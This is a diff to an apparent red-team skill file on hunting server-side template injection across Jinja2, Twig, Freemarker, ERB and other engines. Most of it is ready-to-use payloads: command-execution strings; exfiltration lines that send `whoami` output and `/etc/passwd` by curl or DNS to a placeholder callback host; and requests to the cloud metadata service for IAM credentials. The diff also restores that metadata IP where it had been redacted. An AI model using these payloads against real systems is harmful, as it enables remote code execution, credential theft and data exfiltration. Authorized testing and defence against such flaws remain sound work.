@@ -4,8 +4,10 @@ description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Dj
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [ssti, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [ssti, hunt, redteam]
+  category: redteam
 ---
 
 ## When to Use
@@ -14,9 +16,39 @@ Use when the target has any endpoint that renders user-controlled input through 
 
 **Triggering contexts:** email templates (order confirmations, password resets, welcome emails), PDF/report generators, CMS preview features (page builder previews, theme editors), error pages that reflect user input, profile bio/name/description fields rendered by server-side templates, URL path parameters reflected in templates, and inline translation strings with interpolation.
 
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```text
+# Jinja2 — exfil via DNS
+{{lipsum.__globals__.os.popen('nslookup $(whoami).COLLAB').read()}}
+
+# Twig — exfil via HTTP
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{_self.env.getFilter("curl http://COLLAB/blind-ssti")}}
+
+# Freemarker — exfil via URL
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(
+  "".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),
+  "curl http://COLLAB/blind-fm")}
+
+# ERB — exfil via open3
+<%= Open3.popen3('curl http://COLLAB/erb-blind').read %>
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Quick Reference
 
-```bash
+```text
 # Detection polyglot — try this in EVERY user-controlled field
 {{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
 # Expectation: 49 appears in the response (or 7777777 for Jinja2 string repetition)
@@ -117,7 +149,7 @@ ${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
 
 When SSTI output isn't reflected but the template still evaluates (email templates, PDF generation), use OOB detection:
 
-```bash
+```text
 # Jinja2 — exfil via DNS
 {{lipsum.__globals__.os.popen('nslookup $(whoami).COLLAB').read()}}
 
@@ -136,7 +168,7 @@ ${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).inv
 
 ### Phase 4 — Chaining
 
-```bash
+```text
 # SSTI → RCE → internal network scan
 {{lipsum.__globals__.os.popen('curl http://COLLAB/$(hostname)').read()}}
 
@@ -144,7 +176,7 @@ ${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).inv
 {{lipsum.__globals__.os.popen('curl -F "file=@/etc/passwd" http://COLLAB/exfil').read()}}
 
 # SSTI → cloud metadata
-{{lipsum.__globals__.os.popen('curl http://[REDACTED_IP]/latest/meta-data/').read()}}
+{{lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read()}}
 ```
 
 ## Attack Surface Signals
@@ -265,30 +297,6 @@ ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilde
 <%= system("curl http://COLLAB/$(id)") %>
 ```
 
-## Verification
-
-Run this self-test to confirm ssti hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-ssti" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **SSTI without code execution** — `{{7*7}}` returning 49 proves template injection. Need to escalate to code execution (RCE) or file read for impact.
 - **Sandboxed template engines** — Jinja2 sandbox, Twig sandbox, etc. require specific bypass techniques. Don't assume unsandboxed execution.
@@ -297,11 +305,18 @@ All 3 tests verify the skill is properly structured and ready for use.
 
 ---
 
+## Verification
+- In-band confirmation requires arithmetic evaluation (`{{7*7}}` renders `49`), not mere reflection.
+- Blind confirmation requires an OOB callback from the template runtime.
+- The engine fingerprint and exact payload/response are recorded beneath `${OUTPUT_DIR:-./output}`.
+
+---
+
 ## Related Skills
 
 - **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
 - **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
-- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
+- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
 - **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
 - **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
 - **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
